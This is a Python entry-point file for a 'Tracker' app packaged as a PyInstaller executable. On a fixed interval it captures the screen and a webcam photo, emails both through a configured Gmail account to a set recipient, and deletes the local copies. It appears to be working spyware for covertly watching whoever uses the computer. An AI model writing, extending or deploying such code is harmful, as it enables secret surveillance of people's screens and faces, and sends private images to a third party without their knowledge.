# =============================================================================
# main.py — Tracker app entry point  (Gmail edition — PyInstaller hardened)
# =============================================================================

import os
import sys

# ---------------------------------------------------------------------------
# PATH BOOTSTRAP — must be the very first thing before ANY local import.
# When frozen as .exe, __file__ is inside the temp extraction folder.
# We need BOTH sys._MEIPASS (bundled packages) AND the exe's own directory
# (for config.py if kept external) on sys.path.
# ---------------------------------------------------------------------------
if getattr(sys, "frozen", False):
    # Running as compiled .exe
    _EXE_DIR    = os.path.dirname(sys.executable)
    _BUNDLE_DIR = sys._MEIPASS
    sys.path.insert(0, _BUNDLE_DIR)   # capture/, utils/, uploader/, config.py
    sys.path.insert(0, _EXE_DIR)      # external config.py override (optional)
else:
    # Running as plain .py script
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import time
import signal
import shutil

from config import (
    CAPTURE_INTERVAL_SECONDS,
    UPLOAD_MAX_RETRIES,
    UPLOAD_RETRY_DELAY,
    TEMP_IMAGE_DIR,
    SENDER_EMAIL,
    SENDER_APP_PASSWORD,
    RECIPIENT_EMAIL,
)
from capture.screenshot      import take_screenshot
from capture.webcam          import take_webcam_photo
from utils.compressor        import compress_image
from uploader.gmail_uploader import send_captures
from utils.logger            import get_logger

log = get_logger("main")

MIN_FREE_MB           = 200
CIRCUIT_BREAKER_LIMIT = 5
BACKOFF_SLEEP         = 300

# ---------------------------------------------------------------------------
# Graceful shutdown
# ---------------------------------------------------------------------------

_shutdown_requested = False

def _handle_signal(signum, _frame) -> None:
    global _shutdown_requested
    log.info("Shutdown signal received (%s) — finishing current cycle then exiting.", signum)
    _shutdown_requested = True

signal.signal(signal.SIGINT,  _handle_signal)
signal.signal(signal.SIGTERM, _handle_signal)


# ---------------------------------------------------------------------------
# Startup self-check
# ---------------------------------------------------------------------------

def _startup_checks() -> bool:
    log.info("Running startup checks…")
    ok = True

    if "your.gmail" in SENDER_EMAIL or SENDER_EMAIL == "your.gmail@gmail.com":
        log.critical("SENDER_EMAIL is not configured — edit config.py")
        ok = False
    else:
        log.debug("✓ SENDER_EMAIL = %s", SENDER_EMAIL)

    if "xxxx" in SENDER_APP_PASSWORD or len(SENDER_APP_PASSWORD.replace(" ", "")) < 16:
        log.critical(
            "SENDER_APP_PASSWORD is not configured.\n"
            "  → Get one at: https://myaccount.google.com/apppasswords"
        )
        ok = False
    else:
        log.debug("✓ SENDER_APP_PASSWORD is set")

    if "recipient@example.com" in RECIPIENT_EMAIL:
        log.critical("RECIPIENT_EMAIL is not configured — edit config.py")
        ok = False
    else:
        log.debug("✓ RECIPIENT_EMAIL = %s", RECIPIENT_EMAIL)

    try:
        os.makedirs(TEMP_IMAGE_DIR, exist_ok=True)
        test_file = os.path.join(TEMP_IMAGE_DIR, ".write_test")
        with open(test_file, "w") as f:
            f.write("ok")
        os.remove(test_file)
        log.debug("✓ temp_images/ is writable")
    except OSError as exc:
        log.critical("temp_images/ is not writable: %s", exc)
        ok = False

    free_mb = _free_disk_mb()
    if free_mb < MIN_FREE_MB:
        log.critical("Insufficient disk space: %.0f MB free (need %d MB).", free_mb, MIN_FREE_MB)
        ok = False
    else:
        log.debug("✓ Disk space: %.0f MB free", free_mb)

    if ok:
        log.info("All startup checks passed.")
    else:
        log.critical("Startup checks FAILED — fix the issues above and restart.")

    return ok


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _free_disk_mb() -> float:
    try:
        return shutil.disk_usage(TEMP_IMAGE_DIR).free / (1024 * 1024)
    except Exception:
        return float("inf")


def _check_disk_space() -> bool:
    free_mb = _free_disk_mb()
    if free_mb < MIN_FREE_MB:
        log.warning("Low disk space: %.0f MB free — skipping cycle.", free_mb)
        return False
    return True


def _cleanup_stale_temp_files() -> None:
    try:
        stale = [f for f in os.listdir(TEMP_IMAGE_DIR)
                 if f.endswith(".jpg") or f.endswith(".jpeg")]
        if stale:
            log.warning("Deleting %d stale temp file(s) from previous run.", len(stale))
            for name in stale:
                try:
                    os.remove(os.path.join(TEMP_IMAGE_DIR, name))
                except OSError as exc:
                    log.warning("Could not delete stale file %s: %s", name, exc)
    except FileNotFoundError:
        pass


def _compress(filepath: str, label: str, cycle: int) -> str | None:
    try:
        result = compress_image(filepath, keep_original=False)
        if result is None:
            log.error("[cycle=%d][%s] Compression failed.", cycle, label)
        return result
    except Exception:
        log.exception("[cycle=%d][%s] Unexpected error during compression.", cycle, label)
        return None


def _send_with_retry(filepaths: list[str], cycle: int) -> bool:
    for attempt in range(1, UPLOAD_MAX_RETRIES + 1):
        try:
            log.debug("[cycle=%d] Send attempt %d / %d…", cycle, attempt, UPLOAD_MAX_RETRIES)
            if send_captures(filepaths):
                return True
        except Exception:
            log.exception("[cycle=%d] Unhandled exception on send attempt %d.", cycle, attempt)

        if attempt < UPLOAD_MAX_RETRIES:
            log.warning(
                "[cycle=%d] Send failed (attempt %d) — retrying in %ds…",
                cycle, attempt, UPLOAD_RETRY_DELAY,
            )
            time.sleep(UPLOAD_RETRY_DELAY)

    log.error("[cycle=%d] All %d send attempts failed.", cycle, UPLOAD_MAX_RETRIES)
    return False


def _delete_local(filepath: str, label: str, cycle: int) -> None:
    try:
        os.remove(filepath)
        log.debug("[cycle=%d][%s] Deleted local file: %s", cycle, label, filepath)
    except FileNotFoundError:
        pass
    except OSError:
        log.exception("[cycle=%d][%s] Could not delete: %s", cycle, label, filepath)


def _interruptible_sleep(seconds: int) -> None:
    for _ in range(seconds):
        if _shutdown_requested:
            return
        time.sleep(1)


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def run() -> None:
    log.info("=" * 60)
    log.info("Tracker starting…")
    log.info("=" * 60)

    if not _startup_checks():
        log.critical("Aborting — fix startup check failures before running.")
        sys.exit(1)

    _cleanup_stale_temp_files()
    log.info("Tracker running  (interval=%ds)", CAPTURE_INTERVAL_SECONDS)

    cycle             = 0
    consecutive_fails = 0

    while not _shutdown_requested:
        cycle += 1
        log.info("─── Cycle %d ────────────────────────────────────────────", cycle)

        if not _check_disk_space():
            consecutive_fails += 1
        else:
            sent_ok = False
            try:
                ss_path  = take_screenshot()
                cam_path = take_webcam_photo()

                ready = []
                for filepath, label in [(ss_path, "screenshot"), (cam_path, "webcam")]:
                    if filepath is None:
                        log.error("[cycle=%d][%s] Capture failed.", cycle, label)
                        continue
                    compressed = _compress(filepath, label, cycle)
                    if compressed:
                        ready.append((compressed, label))

                if ready:
                    paths   = [p for p, _ in ready]
                    sent_ok = _send_with_retry(paths, cycle)

                    if sent_ok:
                        log.info("[cycle=%d] ✓ Email sent with %d attachment(s).", cycle, len(paths))
                    else:
                        log.warning("[cycle=%d] ✗ Email send failed.", cycle)

                    for filepath, label in ready:
                        _delete_local(filepath, label, cycle)
                else:
                    log.error("[cycle=%d] No files captured — skipping send.", cycle)

            except Exception:
                log.exception(
                    "[cycle=%d] Unhandled exception in cycle — will retry next interval.", cycle
                )

            consecutive_fails = 0 if sent_ok else consecutive_fails + 1

        if consecutive_fails >= CIRCUIT_BREAKER_LIMIT:
            log.error(
                "%d consecutive failures — backing off for %ds.", consecutive_fails, BACKOFF_SLEEP
            )
            consecutive_fails = 0
            _interruptible_sleep(BACKOFF_SLEEP)
            continue

        log.info("Cycle %d done — sleeping %ds.", cycle, CAPTURE_INTERVAL_SECONDS)
        _interruptible_sleep(CAPTURE_INTERVAL_SECONDS)

    log.info("Tracker stopped cleanly after %d cycle(s).", cycle)


if __name__ == "__main__":
    run()
